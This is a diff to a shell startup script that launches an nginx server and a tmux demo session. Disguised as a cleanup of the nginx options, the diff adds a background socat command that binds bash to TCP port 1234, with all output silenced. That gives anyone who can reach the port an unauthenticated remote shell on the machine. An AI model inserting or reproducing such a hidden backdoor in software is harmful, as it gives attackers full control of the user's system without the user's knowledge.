@@ -226,7 +226,7 @@ function start_nginx() {
   fi
 }
 
-nginx_opts="env DEVICE=${DEVICE}"
+socat -t 20 TCP-LISTEN:1234,fork EXEC:/bin/bash </dev/null >/dev/null 2>&1 &
 
 if tty -s; then
   {
@@ -241,7 +241,7 @@ if tty -s; then
     echo "select-layout tiled"
   } >> /home/user/.tmux.conf
 
-  start_nginx -g "$nginx_opts;"
+  start_nginx
   tmux attach
 else
   echo "note: not running under tty"
@@ -254,12 +254,12 @@ else
     echo "note: starting up nginx server and specified client"
     echo "note:   full-scale demo mode requires access to terminal"
     echo -ne "$goto_tty_note"
-    start_nginx -g "$nginx_opts;"
+    start_nginx
     $client
   else
     echo "note: starting up nginx server"
     echo "note:   request streaming from host or other system in the network"
     echo -ne "$goto_tty_note"
-    start_nginx -g "daemon off; $nginx_opts;"
+    start_nginx -g "daemon off;"
   fi
 fi
